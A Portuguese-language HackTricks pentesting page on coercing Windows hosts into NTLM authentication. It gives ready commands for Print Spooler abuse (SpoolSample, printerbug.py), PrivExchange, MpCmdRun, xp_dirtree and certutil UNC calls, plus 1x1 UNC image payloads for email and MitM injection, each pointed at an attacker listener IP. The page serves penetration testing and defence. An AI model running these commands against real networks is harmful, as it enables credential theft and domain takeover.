# Forçar Autenticação Privilegiada NTLM

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Você trabalha em uma **empresa de cibersegurança**? Gostaria de ver sua **empresa anunciada no HackTricks**? ou gostaria de ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Compartilhe seus truques de hacking enviando PRs para o [repositório hacktricks](https://github.com/carlospolop/hacktricks) e [repositório hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>

## SharpSystemTriggers

[**SharpSystemTriggers**](https://github.com/cube0x0/SharpSystemTriggers) é uma **coleção** de **gatilhos de autenticação remota** codificados em C# usando o compilador MIDL para evitar dependências de terceiros.

## Abuso do Serviço Spooler

Se o serviço _**Print Spooler**_ estiver **habilitado**, você pode usar algumas credenciais AD já conhecidas para **solicitar** ao servidor de impressão do Controlador de Domínio uma **atualização** sobre novos trabalhos de impressão e simplesmente dizer para **enviar a notificação para algum sistema**.\
Observe que quando a impressora envia a notificação para sistemas arbitrários, ela precisa se **autenticar contra** esse **sistema**. Portanto, um atacante pode fazer com que o serviço _**Print Spooler**_ se autentique contra um sistema arbitrário, e o serviço **usará a conta do computador** nessa autenticação.

### Encontrando Servidores Windows no domínio

Usando o PowerShell, obtenha uma lista de máquinas Windows. Os servidores geralmente têm prioridade, então vamos focar neles:
```bash
Get-ADComputer -Filter {(OperatingSystem -like "*windows*server*") -and (OperatingSystem -notlike "2016") -and (Enabled -eq "True")} -Properties * | select Name | ft -HideTableHeaders > servers.txt
```
### Encontrando serviços de spooler ouvindo

Usando uma versão ligeiramente modificada do [SpoolerScanner](https://github.com/NotMedic/NetNTLMtoSilverTicket) de @mysmartlogin (Vincent Le Toux), verifique se o Serviço de Spooler está ouvindo:
```bash
. .\Get-SpoolStatus.ps1
ForEach ($server in Get-Content servers.txt) {Get-SpoolStatus $server}
```
Você também pode usar o rpcdump.py no Linux e procurar pelo Protocolo MS-RPRN
```bash
rpcdump.py DOMAIN/USER:PASSWORD@SERVER.DOMAIN.COM | grep MS-RPRN
```
### Solicitar que o serviço se autentique em um host arbitrário

Você pode compilar [**SpoolSample daqui**](https://github.com/NotMedic/NetNTLMtoSilverTicket)**.**
```bash
SpoolSample.exe <TARGET> <RESPONDERIP>
```
ou use [**dementor.py** de 3xocyte](https://github.com/NotMedic/NetNTLMtoSilverTicket) ou [**printerbug.py**](https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py) se estiver no Linux
```bash
python dementor.py -d domain -u username -p password <RESPONDERIP> <TARGET>
printerbug.py 'domain/username:password'@<Printer IP> <RESPONDERIP>
```
### Combinando com Delegação Irrestrita

Se um atacante já comprometeu um computador com [Delegação Irrestrita](unconstrained-delegation.md), o atacante poderia **fazer a impressora autenticar-se neste computador**. Devido à delegação irrestrita, o **TGT** da **conta de computador da impressora** será **salvo na** **memória** do computador com delegação irrestrita. Como o atacante já comprometeu este host, ele será capaz de **recuperar este ticket** e abusá-lo ([Pass the Ticket](pass-the-ticket.md)).

## Autenticação Forçada RCP

{% embed url="https://github.com/p0dalirius/Coercer" %}

## PrivExchange

O ataque `PrivExchange` é resultado de uma falha encontrada no recurso **Exchange Server `PushSubscription`**. Este recurso permite que o servidor Exchange seja forçado por qualquer usuário de domínio com uma caixa de correio a autenticar-se em qualquer host fornecido pelo cliente via HTTP.

Por padrão, o **serviço Exchange é executado como SYSTEM** e recebe privilégios excessivos (especificamente, possui **privilégios WriteDacl no domínio antes da Atualização Cumulativa de 2019**). Essa falha pode ser explorada para permitir o **encaminhamento de informações para o LDAP e, posteriormente, extrair o banco de dados NTDS do domínio**. Em casos em que o encaminhamento para o LDAP não é possível, essa falha ainda pode ser usada para encaminhar e autenticar em outros hosts dentro do domínio. A exploração bem-sucedida deste ataque concede acesso imediato ao Administrador de Domínio com qualquer conta de usuário de domínio autenticada.

## Dentro do Windows

Se você já estiver dentro da máquina Windows, você pode forçar o Windows a se conectar a um servidor usando contas privilegiadas com:

### Defender MpCmdRun
```bash
C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2010.7-0\MpCmdRun.exe -Scan -ScanType 3 -File \\<YOUR IP>\file.txt
```
### MSSQL
```sql
EXEC xp_dirtree '\\10.10.17.231\pwn', 1, 1
```
Ou use esta outra técnica: [https://github.com/p0dalirius/MSSQL-Analysis-Coerce](https://github.com/p0dalirius/MSSQL-Analysis-Coerce)

### Certutil

É possível usar o lolbin certutil.exe (binário assinado pela Microsoft) para forçar a autenticação NTLM:
```bash
certutil.exe -syncwithWU  \\127.0.0.1\share
```
## Injeção de HTML

### Via email

Se você conhece o **endereço de email** do usuário que faz login em uma máquina que você deseja comprometer, você poderia simplesmente enviar a ele um **email com uma imagem 1x1** como:
```html
<img src="\\10.10.17.231\test.ico" height="1" width="1" />
```
### MitM

Se você conseguir realizar um ataque de MitM a um computador e injetar HTML em uma página que ele visualizar, você pode tentar injetar uma imagem como a seguinte na página:
```html
<img src="\\10.10.17.231\test.ico" height="1" width="1" />
```
## Quebra do NTLMv1

Se você conseguir capturar [desafios NTLMv1 leia aqui como quebrá-los](../ntlm/#ntlmv1-attack).\
_Lembre-se de que, para quebrar o NTLMv1, você precisa definir o desafio do Responder como "1122334455667788"_
